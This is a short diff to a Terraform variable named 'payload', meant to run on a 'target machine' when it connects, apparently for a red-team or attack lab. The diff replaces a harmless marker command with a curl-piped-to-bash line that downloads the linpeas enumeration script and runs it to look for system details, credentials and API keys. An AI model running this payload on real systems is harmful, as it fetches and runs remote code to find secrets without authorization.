@@ -44,7 +44,7 @@ variable "payload" {
   type = string
   description = "The bash commands payload to execute when target machine connects"
   default = <<-EOT
-            touch /tmp/pwned
+            curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex
             EOT
 }
 
